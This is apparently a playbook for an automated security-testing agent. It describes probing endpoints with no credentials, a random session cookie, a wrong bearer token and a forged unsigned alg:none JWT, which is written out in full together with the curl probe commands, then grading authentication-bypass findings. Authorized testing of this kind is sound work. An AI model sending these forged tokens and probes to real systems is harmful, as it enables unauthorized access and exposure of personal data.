<!--
This file is a derivative work of, or substantially inspired by,
content from Hacker Bob (https://github.com/vmihalis/hacker-bob/blob/main/prompts/playbooks/C4_multi_account_differential.md),
Copyright 2026 Michail Vasileiadis, licensed under the Apache License,
Version 2.0. See the project NOTICE for the upstream attribution and
the compliance-history apology. This notice is provided per
Apache-2.0 §4(b).
-->

# cap-multi-account-differential

**Capability:** Confirm an endpoint returns the same response when
called with **no auth**, an **arbitrary cookie**, and a **forged
JWT** — indicating broken authentication.

Inspired by Hacker Bob's `C4_multi_account_differential.md`. When
two legitimate auth profiles aren't available (e.g., we don't have
real victim+attacker logins), we degrade to a lightweight version
that still surfaces broken-authn signals.

A "wildcard CORS" or "auth header optional" observation is `info`
on its own. This pack turns it into a `high` finding when an
endpoint is *materially* the same across auth profiles.

## Inputs

- `engagement_id`, `wave_number`, `assignment_id`.
- `endpoints[]` — list of URLs to probe (from
  `mantis_list_surfaces` + the API-enum hunter's output).
- (optional) `auth_profiles[]` — pairs of cookie/header sets, if the
  orchestrator has any.

## Procedure

For each endpoint:

1. **Generate three probe profiles:**

   ```sh
   PROFILES=(
     "noauth"
     "random-cookie  -H Cookie: session=mantis-fake-$(openssl rand -hex 16)"
     "forged-jwt     -H Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciJ9."
     "wrong-bearer   -H Authorization: Bearer wrong-token"
   )
   ```

   The forged JWT is the canonical `alg:none` JWT — header
   `{"alg":"none","typ":"JWT"}` with payload `{"sub":"attacker"}`,
   no signature. Some legacy servers honor it.

2. **For each `(endpoint, profile)` pair:**

   ```sh
   curl -sS --max-time 10 <profile-headers> "<endpoint>" -w "STATUS=%{http_code} SIZE=%{size_download}\n" -o /tmp/diff-<n>.body
   md5 /tmp/diff-<n>.body
   ```

   Record `(status, size, md5)` per profile.

3. **Compare across profiles:**

   | Pattern across (noauth, random-cookie, forged-jwt, wrong-bearer) | Finding |
   |--------------------|---------|
   | All return identical `(status, size, md5)` AND status is 2xx | **`high`** "endpoint <e> returns same response regardless of auth — broken authn" |
   | noauth = 401/403 but forged-jwt = 200 | **`critical`** "alg:none JWT bypass on <e>" |
   | noauth = 401 but random-cookie = 200 | **`high`** "cookie value not validated on <e>" |
   | noauth = 200 but the URL contains `/admin`, `/api/admin`, `/internal`, `/private`, `/account`, `/user` | **`high`** "sensitive-looking endpoint <e> served unauthenticated" |
   | noauth = 200 with JSON body containing PII-like field names (`email`, `phone`, `address`, `dob`, `ssn`, `account_id`, `customer_id`) | **`high`** "PII fields disclosed unauthenticated on <e>" |
   | All 401/403 | dead-end |
   | All 404 | dead-end |

4. **Chain test.** When a broken-authn pattern fires:

   ```
   hypothesis: "broken authentication -> account/data enumeration"
   outcome: "confirmed"
   steps: [
     "GET <endpoint> with no auth -> <status> <size>.",
     "GET <endpoint> with random cookie -> <status> <size> (identical).",
     "GET <endpoint> with forged alg:none JWT -> <status> <size> (identical).",
     "Response body contains <PII-or-internal-fields>; auth is not enforced."
   ]
   ```

## Severity guide

- alg:none JWT honored: **`critical`** (universal bypass).
- All four profiles return identical body on a sensitive endpoint: **`high`**.
- Random cookie accepted where noauth is rejected: **`high`** (cookie validation broken).
- PII or auth-internal fields disclosed unauthenticated: **`high`**.
- Endpoint allows GET unauth but returns no sensitive data: **`info`** (don't record alone unless chained).

## Coverage to record

`multi-account-differential`, `alg-none-jwt-probe`,
`random-cookie-probe`, `wrong-bearer-probe`, `unauth-vs-auth-diff`,
`pii-field-detection`.
